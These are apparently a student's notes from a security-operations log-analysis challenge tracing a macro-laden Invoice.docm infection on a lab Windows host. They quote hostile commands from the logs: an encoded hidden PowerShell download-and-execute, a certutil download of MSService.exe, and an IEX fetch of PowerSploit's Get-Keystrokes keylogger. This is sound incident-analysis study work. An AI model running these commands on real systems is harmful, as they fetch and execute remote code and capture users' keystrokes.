SecOps individual challenge 

\\\\\ KNOWN BENIGN \\\\\

> filebeat.exe  
> cvtres.exe  
a software platform for developing and running applications

\\\\\\

command line process: C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc                    
G.e.t.-.S.m.b.S.h.a.r.e. .|. .C.o.n.v.e.r.t.T.o.-.J.s.o.n.
> ENUMERATES NETWORK SHARES and CONVERTS THEM TO JSON
svchost.exe - handles ervices running on windows 
-k netsvcs - specifies group of services
-p - makes the associated process persistent
-s gpsvc - specifies the group policy client service 

"C:\Windows\regedit.exe" [REGEDIT.EXE]

\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

\\\\ system time was changed 

> Jun 15, 2022 @ 15:43:02.945	 - 	DESKTOP-J22LNE4	 - 	 - 	configuration	change
winlog.event_data.NewTime
Jun 15, 2022 @ 15:43:02.944

winlog.event_data.OldTime
Jun 14, 2022 @ 15:02:51.129

G.e.t.-.S.m.b.S.h.a.r.e. .|. .C.o.n.v.e.r.t.T.o.-.J.s.o.n.
> ENUMERATES NETWORK SHARES and CONVERTS THEM TO JSON

\\\\ logon is successful and user is determined to have administrator access

> Jun 15, 2022 @ 15:43:03.056	 - 	DESKTOP-J22LNE4	 - 	 - 	iam	admin

> Jun 15, 2022 @ 15:43:03.068	services.exe
Subject:
	Security ID:		S-1-5-18
	Account Name:		DESKTOP-J22LNE4$
	Account Domain:		WORKGROUP
	Logon ID:		0x3E7



\\\\ powershell is then ran as a child of [winword.exe]

> Jun 15, 2022 @ 15:43:16.168	powershell.exe	DESKTOP-J22LNE4	
powershell.exe -WindowStyle hidden -EP Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AdAB1AGUAbwBlAG8AcwBsAHgAbwAuAHMAMwAuAHUAcwAtAHcAZQBzAHQALQAyAC4AYQBtAGEAegBvAG4AYQB3AHMALgBjAG8AbQAvAHcAaQBuAHUAcABkAGEAdABlAHIALgBwAHMAMQAnACkA"	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe	process	info	
8560	PowerShell.EXE

\\\\ this was determined by examining these parameters associated with the event:

[process.parent.args]
C:\Program Files\Microsoft Office 15\Root\Office15\WINWORD.EXE, /n, C:\Users\Analysis-Lab\Desktop\ [Invoice.docm] , /o

[process.parent.executable]
C:\Program Files\Microsoft Office 15\root\office15\winword.exe

[process.pe.original_file_name]
PowerShell.EXE

\\\\ the garbled text seen above is base64, converting back and removing full stops gives us 

IEX(New-Object NetWebClient)downloadString('https://tueoeoslxos.3.us-west-2amazonaws.com/winupdater.ps1')

\\\\ this command invokes an expression that uses the NetWebCLient class  to download and execute a script at a given url [https://tueoeoslxos.3.us-west-2amazonaws.com] [winupdater.ps1]



\\\\ multiple windows services designed to prevent piracy / malicious behavior are stopped [sppsvc.exe] [SIHClient.exe] 

> Jun 15, 2022 @ 15:43:39.102	SIHClient.exe	DESKTOP-J22LNE4	
C:\Windows\System32\sihclient.exe  /cv R31wYSHunEypP//kLvFmiA.0.2	
C:\Windows\System32\SIHClient.exe	
process	end	
9208	
sihclient.exe

> Jun 15, 2022 @ 15:43:44.253	sppsvc.exe	DESKTOP-J22LNE4	
(empty)	C:\Windows\System32\sppsvc.exe	
process	end	
6020	
sppsvc.exe



\\\\ temp directory is created

> Jun 15, 2022 @ 15:43:56.925	powershell.exe	DESKTOP-J22LNE4	
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -WindowStyle hidden "mkdir 'C:\temp'"	C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe	
process	end	8,108	
PowerShell.EXE [odd_original_filename]



\\\\ certutil is used to download [MSService.exe] from [https://ibarblkacoiwlkese.s3.amazonaws.com/certificate-key.exe]

> Jun 15, 2022 @ 15:44:02.472	certutil.exe	DESKTOP-J22LNE4	
"C:\Windows\system32\certutil.exe" -urlcache -split -f https://ibarblkacoiwlkese.s3.amazonaws.com/certificate-key.exe C:\ProgramData\MSService.exe	
C:\Windows\SysWOW64\certutil.exe	
process	start	
6244	
CertUtil.exe [odd_original_filename]




\\\\ another powershell command ran 2 processes, both in hidden windows. the first process executes the second one with [bypass_execution_policy] and [no_exit] option. The second process downloads and runs a script from a URL. The script name is [Get-Keystrokes.ps1], which is a script for capturing keystrokes.

[Get-Keystrokes.ps1] logs key presses, time and the active window to a file named [stage.txt], which is located in [C:\temp]

[Get-Keystrokes.ps1] is a module from [PowerSploit]

[https://attack.mitre.org/software/S0194/]

> Jun 15, 2022 @ 15:44:23.004	 - 	DESKTOP-J22LNE4	
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -
WindowStyle hidden powershell.exe -exec Bypass -noexit -C IEX (New-Object Net.WebClient).
DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1') >> C:\temp\stage.txt





[how_Get-Keystrokes.ps1_works]
Engine state is changed from None to Available. 

Details: 
	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.1237
	HostId=959fc15d-384c-4bab-9cf3-e2ee7496a2b4
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -exec Bypass -noexit -C IEX function Get-Keystrokes {
<#
.SYNOPSIS

    Logs keys pressed, time and the active window.
    
    PowerSploit Function: Get-Keystrokes
    Original Authors: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    Revised By: Jesse Davis (@secabstraction)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.PARAMETER LogPath

    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.

.PARAMETER Timeout

    Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.

.PARAMETER PassThru

    Returns the keylogger's PowerShell object, so that it may manipulated (disposed) by the user; primarily for testing purposes.

.EXAMPLE

    Get-Keystrokes -LogPath C:\key.log

.EXAMPLE

    Get-Keystrokes -Timeout 20
    
**.LINK**

    [http://www.obscuresec.com]
    [http://www.exploit-monday.com]
    [https://github.com/secabstraction]

PowerSploit is provided under the 3-clause BSD license below.

*************************************************************

Copyright (c) 2012, Matthew Graeber
All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:

    Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
    Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
    The names of its contributors may not be used to endorse or promote products derived from this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.






\\\\ consent.exe [triggered_when_a_program_needs_administrative_permissions] \\\\

parent pid = 6452



\\\\ 2 start events within 3 minutes of each other: [ process.name = consent.exe and process.event = start ] 

> Jun 15, 2022 @ 15:45:02.936	consent.exe	DESKTOP-J22LNE4	consent.exe 6452 258 000002C0D62E0500	
C:\Windows\System32\consent.exe	
process	start	
9096

> Jun 15, 2022 @ 15:47:16.987	consent.exe	DESKTOP-J22LNE4	consent.exe 6452 258 000002C0D62E03D0	
C:\Windows\System32\consent.exe	
process	start	
1528



\\\\ there are also event.category [library] start events within seconds of each process start event

\\\\ in between each start event consent.exe performs registry access as well as the previously mentioned library start

\\\\ in the first process start event, a registry change is made as well

> Jun 15, 2022 @ 15:45:03.599	svchost.exe	DESKTOP-J22LNE4	 - 	
C:\Windows\System32\svchost.exe	registry	change	
1140

[registry.key]
SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileService\References\S-1-5-21-2456954166-4155419520-3527367723-1001

[registry.path]
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileService\References\S-1-5-21-2456954166-4155419520-3527367723-1001\RefCount


> Jun 15, 2022 @ 15:45:03.156	consent.exe	DESKTOP-J22LNE4	 - 	
C:\Windows\System32\consent.exe	library	start	
9096

> Jun 15, 2022 @ 15:45:03.135	consent.exe	DESKTOP-J22LNE4	 - 	
C:\Windows\System32\consent.exe	registry	access	
9096



\\ second event \\ 

> Jun 15, 2022 @ 15:47:17.065	consent.exe	DESKTOP-J22LNE4	 - 	
C:\Windows\System32\consent.exe	library	start	1,528

> Jun 15, 2022 @ 15:47:17.051	consent.exe	DESKTOP-J22LNE4	 - 	
C:\Windows\System32\consent.exe	registry	access	1,528



\\\\ in between the first and second start event, [wlidsvc.exe] and [wmiprvse.exe] [ windows error reporting services ] are killed

> Jun 15, 2022 @ 15:47:02.197	svchost.exe	DESKTOP-J22LNE4	
C:\Windows\system32\svchost.exe -k netsvcs -p -s wlidsvc		
process	end	
6540

> Jun 15, 2022 @ 15:45:18.972	WmiPrvSE.exe DESKTOP-J22LNE4	
C:\Windows\system32\wbem\wmiprvse.exe	
C:\Windows\System32\wbem\WmiPrvSE.exe	< [this_camelcase_is_weird]
process	end	
8104



\\\\ after the second start event, [regedit.exe] starts and roughly ~20 registry changes are made by [explorer.exe]
\\\\ four more registry changes are made by [lsass.exe] before it appears that [gpsvc] is killed

> Jun 15, 2022 @ 15:48:12.617	
svchost.exe	DESKTOP-J22LNE4	C:\Windows\system32\svchost.exe -k netsvcs -p -s [gpsvc]	
C:\Windows\System32\svchost.exe	
process	end
[killed_group_policy_client_service]



\\\\ immediately after this event, [winword.exe] makes another registry change

// process.name = winword.exe

> Jun 15, 2022 @ 15:48:13.742	
winword.exe	DESKTOP-J22LNE4	 - 	
C:\Program Files\Microsoft Office 15\root\office15\ [winword.exe]	
registry	change	
276



\\\\ the only other event visibly linked to [winword.exe] is a network end event that appears to have occurred before the first
[consent.exe] start event 

> Jun 15, 2022 @ 15:45:02.185	winword.exe	DESKTOP-J22LNE4	 - 	
C:\Program Files\Microsoft Office 15\root\office15\winword.exe	
network	end	
276













after the powershell command runs 

C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden certutil.exe -urlcache -split -f https://ibarblkacoiwlkese.s3.amazonaws.com/certificate-key.exe C:\ProgramData\MSService.exe

- a hidden powershell window is opened
- MSService.exe is downloaded from ibarblkacoiwlkese.s3.amazonaws.com/certificate-key.exe
- Msservice is saved to ProgramData



ID: T1543 Create or Modify System Process
> M1022 Restrict read/write access to system-level process files to only select privileged users who have a legitimate need to manage system services.

